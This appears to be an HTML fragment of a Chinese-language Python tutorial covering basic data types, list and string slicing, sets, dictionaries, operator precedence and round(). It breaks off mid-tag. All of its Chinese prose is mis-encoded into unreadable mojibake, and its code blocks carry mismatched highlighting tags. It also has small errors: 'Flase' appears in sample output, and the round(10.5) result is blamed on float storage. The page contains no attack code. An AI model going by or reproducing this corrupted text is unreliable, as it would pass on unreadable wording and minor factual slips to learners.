href="#åŸºæœ¬æ•°æ®ç±»å‹">ğŸ­</a>åŸºæœ¬æ•°æ®ç±»å‹</h2><h4 id="å¤šä¸ªå˜é‡èµ‹å€¼"><a class="header-anchor" href="#å¤šä¸ªå˜é‡èµ‹å€¼">ğŸ­</a>å¤šä¸ªå˜é‡èµ‹å€¼</h4><p>pythonå¯å®ç°å¤šä¸ªå˜é‡èµ‹å€¼</p><pre><code class="hljs nix"><span class="hljs-attr">a</span> = <span class="hljs-attr">b</span> = <span class="hljs-attr">c</span> = <span class="hljs-number">1</span></code></pre><p>or</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>, b, c = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&quot;blackpink&quot;</span></code></pre><h2 id="æ ‡å‡†æ•°æ®ç±»å‹"><a class="header-anchor" href="#æ ‡å‡†æ•°æ®ç±»å‹">ğŸ­</a>æ ‡å‡†æ•°æ®ç±»å‹</h2><ul><li>**ä¸å¯å˜æ•°æ®ï¼ˆ3 ä¸ªï¼‰ï¼š**Numberï¼ˆæ•°å­—ï¼‰ã€Stringï¼ˆå­—ç¬¦ä¸²ï¼‰ã€Tupleï¼ˆå…ƒç»„ï¼‰ï¼›</li><li>**å¯å˜æ•°æ®ï¼ˆ3 ä¸ªï¼‰ï¼š**Listï¼ˆåˆ—è¡¨ï¼‰ã€Dictionaryï¼ˆå­—å…¸ï¼‰ã€Setï¼ˆé›†åˆï¼‰ã€‚</li></ul><h4 id="Number"><a class="header-anchor" href="#Number">ğŸ­</a>Number</h4><p>æœ‰intã€floatã€boolã€complex</p><p>type() å‡½æ•°å¯ä»¥ç”¨æ¥æŸ¥è¯¢å˜é‡æ‰€æŒ‡çš„å¯¹è±¡ç±»å‹ã€‚</p><pre><code class="hljs haskell">&gt;&gt;&gt; a, b, c, d = <span class="hljs-number">20</span>, <span class="hljs-number">9.5</span>, <span class="hljs-type">True</span>, <span class="hljs-number">5</span>+<span class="hljs-number">6</span>j&gt;&gt;&gt; print(<span class="hljs-class"><span class="hljs-keyword">type</span>(<span class="hljs-title">a</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">b</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">c</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">d</span>))</span>&lt;<span class="hljs-keyword">class</span> &#x27;int&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;float&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;bool&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;complex&#x27;&gt;</code></pre><p>ä¹Ÿå¯ç”¨ isinstance æ¥åˆ¤æ–­</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; a = <span class="hljs-number">5</span>+<span class="hljs-number">6</span>j<span class="hljs-meta">&gt;&gt;</span>&gt; isinstance(a, int)Flase<span class="hljs-meta">&gt;&gt;</span>&gt;</code></pre><p>æ•°å€¼çš„é™¤æ³•åŒ…å«ä¸¤ä¸ªè¿ç®—ç¬¦ï¼š<strong>/</strong> è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œ<strong>//</strong> è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚åœ¨æ··åˆè®¡ç®—æ—¶ï¼ŒPythonä¼šæŠŠæ•´å‹è½¬æ¢æˆä¸ºæµ®ç‚¹æ•°ã€‚</p><h4 id="String"><a class="header-anchor" href="#String">ğŸ­</a>String</h4><p>å­—ç¬¦ä¸²ç”¨å•å¼•å· <strong>â€™</strong> æˆ–åŒå¼•å· <strong>&quot;</strong> æ‹¬èµ·æ¥ï¼ŒåŒæ—¶ä½¿ç”¨åæ–œæ  \è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>å­—ç¬¦ä¸²æˆªå–çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><pre><code class="hljs css">å˜é‡<span class="hljs-selector-attr">[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡]</span></code></pre><p>ç´¢å¼•å€¼ä»¥ 0 ä¸ºå¼€å§‹å€¼ï¼Œ-1 ä¸ºä»æœ«å°¾çš„å¼€å§‹ä½ç½®ã€‚</p><pre><code class="hljs hsp"><span class="hljs-keyword">str</span> = <span class="hljs-string">&#x27;blackpink&#x27;</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>)          <span class="hljs-meta"># è¾“å‡ºå­—ç¬¦ä¸²</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>])    <span class="hljs-meta"># è¾“å‡ºç¬¬ä¸€ä¸ªåˆ°å€’æ•°ç¬¬äºŒä¸ªçš„æ‰€æœ‰å­—ç¬¦</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">0</span>])       <span class="hljs-meta"># è¾“å‡ºå­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>])     <span class="hljs-meta"># è¾“å‡ºä»ç¬¬ä¸‰ä¸ªå¼€å§‹åˆ°ç¬¬äº”ä¸ªçš„å­—ç¬¦</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">2</span>:])      <span class="hljs-meta"># è¾“å‡ºä»ç¬¬ä¸‰ä¸ªå¼€å§‹çš„åçš„æ‰€æœ‰å­—ç¬¦</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span> * <span class="hljs-number">2</span>)      <span class="hljs-meta"># è¾“å‡ºå­—ç¬¦ä¸²ä¸¤æ¬¡ï¼Œä¹Ÿå¯ä»¥å†™æˆ print (<span class="hljs-number">2</span> * str)</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span> + <span class="hljs-string">&quot;TEST&quot;</span>) <span class="hljs-meta"># è¿æ¥å­—ç¬¦ä¸²</span></code></pre><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">blackpink</span><span class="hljs-keyword">blackpin</span><span class="hljs-keyword">b</span><span class="hljs-keyword">ack</span><span class="hljs-keyword">ackpink</span><span class="hljs-keyword">blackpinkblackpink</span><span class="hljs-keyword">blackpinkTEST</span></code></pre><p>Python ä½¿ç”¨åæ–œæ <code> \</code> è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ä¸è®©åæ–œæ å‘ç”Ÿè½¬ä¹‰ï¼Œå¯åœ¨å­—ç¬¦ä¸²å‰é¢æ·»åŠ ä¸€ä¸ª <code>r</code>ï¼Œè¡¨ç¤ºåŸå§‹å­—ç¬¦ä¸²,åæ–œæ <code>\</code>å¯ä»¥ä½œä¸ºç»­è¡Œç¬¦ï¼Œè¡¨ç¤ºä¸‹ä¸€è¡Œæ˜¯ä¸Šä¸€è¡Œçš„å»¶ç»­;ä¹Ÿå¯ä»¥ä½¿ç”¨ <strong>â€œâ€â€œâ€¦â€â€œâ€</strong> æˆ–è€… <strong>â€˜â€™â€˜â€¦â€™â€˜â€™</strong> è·¨è¶Šå¤šè¡Œã€‚</p><h4 id="List"><a class="header-anchor" href="#List">ğŸ­</a>List</h4><p>åˆ—è¡¨æ˜¯å†™åœ¨æ–¹æ‹¬å· <strong>[]</strong> ä¹‹é—´ç”¨é€—å·åˆ†éš”å¼€çš„å…ƒç´ åˆ—è¡¨ã€‚åˆ—è¡¨åŒæ ·å¯ä»¥è¢«ç´¢å¼•å’Œæˆªå–ï¼Œåˆ—è¡¨è¢«æˆªå–åè¿”å›ä¸€ä¸ªåŒ…å«æ‰€éœ€å…ƒç´ çš„æ–°åˆ—è¡¨ï¼Œè¯­æ³•ä¸stringç›¸åŒã€‚</p><pre><code class="hljs livescript"><span class="hljs-keyword">list</span> = [ <span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span> , <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span> ]tinylist = [<span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>]<span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>)            <span class="hljs-comment"># è¾“å‡ºå®Œæ•´åˆ—è¡¨</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">0</span>])         <span class="hljs-comment"># è¾“å‡ºåˆ—è¡¨ç¬¬ä¸€ä¸ªå…ƒç´ </span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>])       <span class="hljs-comment"># ä»ç¬¬äºŒä¸ªå¼€å§‹è¾“å‡ºåˆ°ç¬¬ä¸‰ä¸ªå…ƒç´ </span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">2</span>:])        <span class="hljs-comment"># è¾“å‡ºä»ç¬¬ä¸‰ä¸ªå…ƒç´ å¼€å§‹çš„æ‰€æœ‰å…ƒç´ </span><span class="hljs-built_in">print</span> (tinylist * <span class="hljs-number">2</span>)    <span class="hljs-comment"># è¾“å‡ºä¸¤æ¬¡åˆ—è¡¨</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span> + tinylist) <span class="hljs-comment"># è¿æ¥åˆ—è¡¨</span></code></pre><p>è¾“å‡ºå¦‚ä¸‹:</p><pre><code class="hljs angelscript">[<span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>]abcd[<span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>][<span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>][<span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>][<span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>]</code></pre><p>åˆ—è¡¨ä¸­çš„å…ƒç´ å¯ä»¥åˆ é™¤</p><pre><code class="hljs applescript">del <span class="hljs-built_in">list</span>[]</code></pre><p>å¯ä»¥å˜åŒ–</p><pre><code class="hljs applescript"><span class="hljs-built_in">list</span>[] = æ”¹å˜çš„å€¼</code></pre><p>Python åˆ—è¡¨æˆªå–å¯ä»¥æ¥æ”¶ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‚æ•°ä½œç”¨æ˜¯æˆªå–çš„æ­¥é•¿ï¼Œä»¥ä¸‹å®ä¾‹åœ¨ç´¢å¼• 1 åˆ°ç´¢å¼• 4 çš„ä½ç½®å¹¶è®¾ç½®ä¸ºæ­¥é•¿ä¸º 2ï¼ˆé—´éš”ä¸€ä¸ªä½ç½®ï¼‰æ¥æˆªå–å­—ç¬¦ä¸²ã€‚</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; letters = [<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>]<span class="hljs-meta">&gt;&gt;</span>&gt; letters[<span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>][<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]</code></pre><p>å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºè´Ÿæ•°è¡¨ç¤ºé€†å‘è¯»å–</p><p>inputWords[-1::-1] æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ ç¬¬ä¸€ä¸ªå‚æ•° -1 è¡¨ç¤ºæœ€åä¸€ä¸ªå…ƒç´ ï¼Œ ç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œè¡¨ç¤ºç§»åŠ¨åˆ°åˆ—è¡¨æœ«å°¾ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºæ­¥é•¿ï¼Œ-1 è¡¨ç¤ºé€†å‘ã€‚</p><h4 id="Tuple"><a class="header-anchor" href="#Tuple">ğŸ­</a>Tuple</h4><p>tupleçš„å…ƒç´ ä¸èƒ½ä¿®æ”¹,ä½†å¯ä»¥å¯¹å…ƒç»„è¿›è¡Œè¿æ¥ç»„åˆï¼Œ</p><pre><code class="hljs smali">tup3 = tup1 + tup2</code></pre><p>å…ƒç»„åº”å†™åœ¨å°æ‹¬å· <strong>()</strong> é‡Œï¼Œå…ƒç´ ä¹‹é—´ç”¨é€—å·éš”å¼€,å…ƒç»„ä¸­çš„å…ƒç´ ç±»å‹ä¹Ÿå¯ä»¥ä¸ç›¸åŒã€‚</p><p>å…ƒç»„ä¸­çš„å…ƒç´ å€¼æ˜¯ä¸å…è®¸åˆ é™¤çš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨delè¯­å¥æ¥åˆ é™¤æ•´ä¸ªå…ƒç»„ï¼š</p><pre><code class="hljs dos"><span class="hljs-built_in">del</span> tup</code></pre><p>ç‰¹æ®Šæƒ…å†µ:</p><pre><code class="hljs ini"><span class="hljs-attr">tup1</span> = ()    <span class="hljs-comment"># ç©ºå…ƒç»„</span><span class="hljs-attr">tup2</span> = (<span class="hljs-number">20</span>,) <span class="hljs-comment"># ä¸€ä¸ªå…ƒç´ ï¼Œéœ€è¦åœ¨å…ƒç´ åæ·»åŠ é€—å·</span></code></pre><h4 id="Set"><a class="header-anchor" href="#Set">ğŸ­</a>Set</h4><p>ä½¿ç”¨å¤§æ‹¬å· <strong>{ }</strong> æˆ–è€… <strong>set()</strong> å‡½æ•°åˆ›å»ºé›†åˆ,<strong>åˆ›å»ºä¸€ä¸ªç©ºé›†åˆå¿…é¡»ç”¨ <code>set()</code>è€Œä¸æ˜¯ <code>&#123; &#125;</code>ï¼Œå› <code>&#123; &#125;</code> æ˜¯ç”¨æ¥åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ã€‚</strong></p><pre><code class="hljs bash">b = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;blackpink&#x27;</span>)a = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;blackpink in your area&#x27;</span>)<span class="hljs-built_in">print</span>(a)<span class="hljs-built_in">print</span>(a - b)     <span class="hljs-comment"># a å’Œ b çš„å·®é›†</span><span class="hljs-built_in">print</span>(a | b)     <span class="hljs-comment"># a å’Œ b çš„å¹¶é›†</span><span class="hljs-built_in">print</span>(a &amp; b)     <span class="hljs-comment"># a å’Œ b çš„äº¤é›†</span><span class="hljs-built_in">print</span>(a ^ b)     <span class="hljs-comment"># a å’Œ b ä¸­ä¸åŒæ—¶å­˜åœ¨çš„å…ƒç´ </span></code></pre><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><pre><code class="hljs 1c">&#123;&#x27;y&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;b&#x27;, &#x27;o&#x27;, &#x27; &#x27;, &#x27;c&#x27;, &#x27;p&#x27;, &#x27;i&#x27;&#125;&#123;&#x27;e&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27; &#x27;, &#x27;y&#x27;&#125;&#123;&#x27;e&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;y&#x27;, &#x27;p&#x27;, &#x27;i&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;b&#x27;, &#x27; &#x27;, &#x27;c&#x27;&#125;&#123;&#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;l&#x27;, &#x27;c&#x27;, &#x27;p&#x27;, &#x27;i&#x27;&#125;&#123;&#x27;y&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27; &#x27;&#125;</code></pre><h4 id="æ·»åŠ å…ƒç´ "><a class="header-anchor" href="#æ·»åŠ å…ƒç´ ">ğŸ­</a>æ·»åŠ å…ƒç´ </h4><p>è¯­æ³•:</p><pre><code class="hljs sas">s.<span class="hljs-meta">add</span>( <span class="hljs-meta">x</span> ) <span class="hljs-meta">or</span> s.u<span class="hljs-meta">pdate(</span> <span class="hljs-meta">x</span> )</code></pre><h4 id="ç§»é™¤å…ƒç´ "><a class="header-anchor" href="#ç§»é™¤å…ƒç´ ">ğŸ­</a>ç§»é™¤å…ƒç´ </h4><p>è¯­æ³•:</p><pre><code class="hljs sas">s.<span class="hljs-meta">remove</span>( <span class="hljs-meta">x</span> ) <span class="hljs-meta">or</span> s.discard( <span class="hljs-meta">x</span> )</code></pre><h4 id="æ¸…ç©ºé›†åˆ"><a class="header-anchor" href="#æ¸…ç©ºé›†åˆ">ğŸ­</a>æ¸…ç©ºé›†åˆ</h4><p>è¯­æ³•:</p><pre><code class="hljs arduino">s.<span class="hljs-built_in">clear</span>()</code></pre><p>å­—å…¸æ˜¯ä¸€ç§æ˜ å°„ç±»å‹ï¼Œå­—å…¸ç”¨ <strong>{ }</strong> æ ‡è¯†ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ— åºçš„ <strong>é”®(key) : å€¼(value)</strong> çš„é›†åˆã€‚é”®(key)å¿…é¡»ä½¿ç”¨ä¸å¯å˜ç±»å‹ã€‚åœ¨åŒä¸€ä¸ªå­—å…¸ä¸­ï¼Œé”®(key)å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œå€¼åˆ™ä¸ç”¨ã€‚</p><p>åˆ é™¤ï¼š</p><pre><code class="hljs mipsasm">del <span class="hljs-keyword">dict[&#x27;Name&#x27;] </span><span class="hljs-comment"># åˆ é™¤é”® &#x27;Name&#x27;</span><span class="hljs-keyword">dict.clear() </span>    <span class="hljs-comment"># æ¸…ç©ºå­—å…¸</span>del <span class="hljs-keyword">dict </span>        <span class="hljs-comment"># åˆ é™¤å­—å…¸</span></code></pre><p><strong>ä¸å…è®¸åŒä¸€ä¸ªé”®å‡ºç°ä¸¤æ¬¡ã€‚åˆ›å»ºæ—¶å¦‚æœåŒä¸€ä¸ªé”®è¢«èµ‹å€¼ä¸¤æ¬¡ï¼Œåä¸€ä¸ªå€¼ä¼šè¢«è®°ä½</strong></p><h4 id="æ— é™æåµŒå¥—"><a class="header-anchor" href="#æ— é™æåµŒå¥—">ğŸ­</a>æ— é™æåµŒå¥—</h4><p>æŸ¥è¯¢è¯­æ³•ï¼š</p><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> ç±»åˆ«[<span class="hljs-string">&#x27;&#x27;</span>]:    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span></code></pre><h2 id="Python-è¿ç®—ç¬¦"><a class="header-anchor" href="#Python-è¿ç®—ç¬¦">ğŸ­</a>Python è¿ç®—ç¬¦</h2><h4 id="æˆå‘˜è¿ç®—ç¬¦"><a class="header-anchor" href="#æˆå‘˜è¿ç®—ç¬¦">ğŸ­</a>æˆå‘˜è¿ç®—ç¬¦</h4><table><thead><tr><th style="text-align:left">è¿ç®—ç¬¦</th><th style="text-align:left">æè¿°</th><th style="text-align:center">å®ä¾‹</th></tr></thead><tbody><tr><td style="text-align:left">in</td><td style="text-align:left">å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ‰¾åˆ°å€¼è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚</td><td style="text-align:center">x åœ¨ y åºåˆ—ä¸­ , å¦‚æœ x åœ¨ y åºåˆ—ä¸­è¿”å› Trueã€‚</td></tr><tr><td style="text-align:left">not in</td><td style="text-align:left">å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ²¡æœ‰æ‰¾åˆ°å€¼è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚</td><td style="text-align:center">x ä¸åœ¨ y åºåˆ—ä¸­ , å¦‚æœ x ä¸åœ¨ y åºåˆ—ä¸­è¿”å› Trueã€‚</td></tr></tbody></table><h4 id="èº«ä»½è¿ç®—ç¬¦"><a class="header-anchor" href="#èº«ä»½è¿ç®—ç¬¦">ğŸ­</a>èº«ä»½è¿ç®—ç¬¦</h4><table><thead><tr><th style="text-align:left">è¿ç®—ç¬¦</th><th style="text-align:left">æè¿°</th><th style="text-align:left">å®ä¾‹</th></tr></thead><tbody><tr><td style="text-align:left">is</td><td style="text-align:left">is æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨è‡ªä¸€ä¸ªå¯¹è±¡</td><td style="text-align:left"><strong>x is y</strong>, ç±»ä¼¼ <strong>id(x) == id(y)</strong> , å¦‚æœå¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</td></tr><tr><td style="text-align:left">is not</td><td style="text-align:left">is not æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨è‡ªä¸åŒå¯¹è±¡</td><td style="text-align:left"><strong>x is not y</strong> ï¼Œ ç±»ä¼¼ <strong>id(a) != id(b)</strong>ã€‚å¦‚æœå¼•ç”¨çš„ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡åˆ™è¿”å›ç»“æœ Trueï¼Œå¦åˆ™è¿”å› Falseã€‚</td></tr></tbody></table><h4 id="è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a class="header-anchor" href="#è¿ç®—ç¬¦ä¼˜å…ˆçº§">ğŸ­</a>è¿ç®—ç¬¦ä¼˜å…ˆçº§</h4><table><thead><tr><th style="text-align:left">è¿ç®—ç¬¦</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">**</td><td style="text-align:left">æŒ‡æ•° (æœ€é«˜ä¼˜å…ˆçº§)</td></tr><tr><td style="text-align:left">~ + -</td><td style="text-align:left">æŒ‰ä½ç¿»è½¬, ä¸€å…ƒåŠ å·å’Œå‡å· (æœ€åä¸¤ä¸ªçš„æ–¹æ³•åä¸º +@ å’Œ -@)</td></tr><tr><td style="text-align:left">* / % //</td><td style="text-align:left">ä¹˜ï¼Œé™¤ï¼Œæ±‚ä½™æ•°å’Œå–æ•´é™¤</td></tr><tr><td style="text-align:left">+ -</td><td style="text-align:left">åŠ æ³•å‡æ³•</td></tr><tr><td style="text-align:left">&gt;&gt; &lt;&lt;</td><td style="text-align:left">å³ç§»ï¼Œå·¦ç§»è¿ç®—ç¬¦</td></tr><tr><td style="text-align:left">&amp;</td><td style="text-align:left">ä½ â€˜ANDâ€™</td></tr><tr><td style="text-align:left">^ |</td><td style="text-align:left">ä½è¿ç®—ç¬¦</td></tr><tr><td style="text-align:left">&lt;= &lt; &gt; &gt;=</td><td style="text-align:left">æ¯”è¾ƒè¿ç®—ç¬¦</td></tr><tr><td style="text-align:left">== !=</td><td style="text-align:left">ç­‰äºè¿ç®—ç¬¦</td></tr><tr><td style="text-align:left">= %= /= //= -= += *= **=</td><td style="text-align:left">èµ‹å€¼è¿ç®—ç¬¦</td></tr><tr><td style="text-align:left">is is not</td><td style="text-align:left">èº«ä»½è¿ç®—ç¬¦</td></tr><tr><td style="text-align:left">in not in</td><td style="text-align:left">æˆå‘˜è¿ç®—ç¬¦</td></tr><tr><td style="text-align:left">not and or</td><td style="text-align:left">é€»è¾‘è¿ç®—ç¬¦</td></tr></tbody></table><h2 id="æ•°å­—"><a class="header-anchor" href="#æ•°å­—">ğŸ­</a>æ•°å­—</h2><h4 id="æ•°å­—ç±»å‹è½¬æ¢"><a class="header-anchor" href="#æ•°å­—ç±»å‹è½¬æ¢">ğŸ­</a>æ•°å­—ç±»å‹è½¬æ¢</h4><ul><li><strong>int(x)</strong> å°†xè½¬æ¢ä¸ºä¸€ä¸ªæ•´æ•°ã€‚</li><li><strong>float(x)</strong> å°†xè½¬æ¢åˆ°ä¸€ä¸ªæµ®ç‚¹æ•°ã€‚</li><li><strong>complex(x)</strong> å°†xè½¬æ¢åˆ°ä¸€ä¸ªå¤æ•°ï¼Œå®æ•°éƒ¨åˆ†ä¸º xï¼Œè™šæ•°éƒ¨åˆ†ä¸º 0ã€‚</li><li><strong>complex(x, y)</strong> å°† x å’Œ y è½¬æ¢åˆ°ä¸€ä¸ªå¤æ•°ï¼Œå®æ•°éƒ¨åˆ†ä¸º xï¼Œè™šæ•°éƒ¨åˆ†ä¸º yã€‚x å’Œ y æ˜¯æ•°å­—è¡¨è¾¾å¼ã€‚</li></ul><p>åœ¨æ•´æ•°é™¤æ³•ä¸­ï¼Œé™¤æ³• <strong>/</strong> æ€»æ˜¯è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œå¦‚æœåªæƒ³å¾—åˆ°æ•´æ•°çš„ç»“æœï¼Œä¸¢å¼ƒå¯èƒ½çš„åˆ†æ•°éƒ¨åˆ†ï¼Œå¯ä»¥ä½¿ç”¨è¿ç®—ç¬¦ <strong>//</strong> ã€‚ä½†**//** å¾—åˆ°çš„å¹¶ä¸ä¸€å®šæ˜¯æ•´æ•°ç±»å‹çš„æ•°ï¼Œå®ƒä¸åˆ†æ¯åˆ†å­çš„æ•°æ®ç±»å‹æœ‰å…³ç³»ã€‚</p><h4 id="roundï¼ˆæµ®ç‚¹æ•°å­˜å‚¨æœ‰ç‚¹å¥‡æ€ªï¼‰"><a class="header-anchor" href="#roundï¼ˆæµ®ç‚¹æ•°å­˜å‚¨æœ‰ç‚¹å¥‡æ€ªï¼‰">ğŸ­</a>roundï¼ˆæµ®ç‚¹æ•°å­˜å‚¨æœ‰ç‚¹å¥‡æ€ªï¼‰</h4><pre><code class="hljs gauss"><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.4</span>)) <span class="hljs-meta">#10</span><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.5</span>)) <span class="hljs-meta">#10</span><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.6</span>)) <span class="hljs-meta">#11</span></code></pre><p>å½“ä¸ªä½ä¸ºå¥‡æ•°ï¼Œå°æ•°éƒ¨åˆ†&gt;=0.5å…¥ï¼Œå…¶ä½™ä¸ºèˆ;å½“ä¸ªä½ä¸ºå¶æ•°ï¼Œå°æ•°éƒ¨åˆ†&gt;0.5å…¥ï¼Œå…¶ä½™ä¸ºèˆã€‚</p><h4 id="å’Œ-çš„ä¸åŒ"><a class="header-anchor" href="#å’Œ-çš„ä¸åŒ">ğŸ­</a><strong>+=</strong> å’Œ <strong>=+</strong> çš„ä¸åŒ</h4><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; a = <span class="hljs-number">5</span><span class="hljs-meta">&gt;&gt;</span>&gt; a += <span class="hljs-number">6</span> <span class="hljs-comment">#ä¸a=a+6æ•ˆæœç›¸åŒ</span><span class="hljs-meta">&gt;&gt;</span>&gt; a<span class="hljs-number">11</span></code></pre><p>å¯¹æ¯”</p><pre><code class="hljs angelscript">&gt;&gt;&gt; b = +<span class="hljs-number">6</span>  # å…¶å®å°±æ˜¯æ­£æ•°ï¼Œæ˜¯ä¸€ä¸ªèµ‹å€¼æ“ä½œï¼Œ+ <span class="hljs-number">6</span> å³ä¸º +<span class="hljs-number">6</span>ï¼Œ+<span class="hljs-number">6</span> ä¸º <span class="hljs-number">6</span></code></pre><h2 id="Python-å­—ç¬¦ä¸²"><a class="header-anchor" href="#Python-å­—ç¬¦ä¸²">ğŸ­</a>Python å­—ç¬¦ä¸²</h2><h4 id="å­—ç¬¦ä¸²æ›´æ–°"><a class="header-anchor" href="#å­—ç¬¦ä¸²æ›´æ–°">ğŸ­</a>å­—ç¬¦ä¸²æ›´æ–°</h4><pre><code class="hljs routeros">var1 = <span class="hljs-string">&#x27;Hello world!&#x27;</span> <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;å·²æ›´æ–°å­—ç¬¦ä¸² : &quot;</span>, var1[:6] + <span class="hljs-string">&#x27;blackpink!&#x27;</span>)</code></pre><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><pre><code class="hljs ada">å·²æ›´æ–°å­—ç¬¦ä¸² :  <span class="hljs-type">Hello</span> blackpink!</code></pre><h4 id="ä¸‰å¼•å·"><a class="header-anchor" href="#ä¸‰å¼•å·">ğŸ­</a>ä¸‰å¼•å·</h4><p>å…è®¸ä¸€ä¸ªå­—ç¬¦ä¸²è·¨å¤šè¡Œï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥åŒ…å«æ¢è¡Œç¬¦ã€åˆ¶è¡¨ç¬¦ä»¥åŠå…¶ä»–ç‰¹æ®Šå­—ç¬¦ã€‚</p><pre><code class="hljs python">para_str = <span 